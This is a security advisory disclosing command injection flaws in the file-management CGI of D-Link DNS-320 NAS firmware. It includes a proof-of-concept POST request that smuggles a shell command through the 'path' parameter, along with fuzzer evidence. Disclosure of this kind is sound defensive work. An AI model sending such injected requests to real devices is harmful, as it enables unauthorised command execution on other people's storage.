## D-Link DNS-320 webfile_mgr.cgi Multiple OS Command Injection via File Operations

### Title

```
D-Link DNS-320 webfile_mgr.cgi Multiple OS Command Injection via File Operations
```

### Vendor / Product / Version

```
D-Link Corporation / DNS-320 ShareCenter NAS (Rev.A) / Firmware 2.06B01 HOTFIX
```

### Component

```
/cgi-bin/webfile_mgr.cgi — 8 vulnerable functions (cgi_del, cgi_rename, cgi_copy, cgi_move, etc.)
```

### Vulnerability Type

```
CWE-78: OS Command Injection
```

### CVSS 3.1

```
8.8 (High) CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H
```

### Description

```
Multiple OS command injection vulnerabilities exist in webfile_mgr.cgi
of D-Link DNS-320 firmware 2.06B01. File operation functions (delete,
rename, copy, move, chmod, chown) read path/name parameters via
cgiFormString() and embed them in shell commands via sprintf() → system().

Primary injection point: cgi_del (0xca9c) — rm "%s" via path parameter.

Verification: Unicorn Fuzzer CONFIRMED cgi_del with 8 crashes.
```

### Proof of Concept

```http
POST /cgi-bin/webfile_mgr.cgi HTTP/1.1
Host: <target>
Cookie: <valid_session>

cmd=cgi_del&path=;id&type=file
```

### Unicorn Fuzzer Evidence

```json
{"target_id": "dlink@@DNS320@@webfile_mgr@@0xca9c", "crash_type": "command_injection", "severity": "confirmed", "crashes": 8}
```

### Credit

```
Discovered by ST4R using FirmRec automated symbolic execution + Unicorn Fuzzer engine.
```

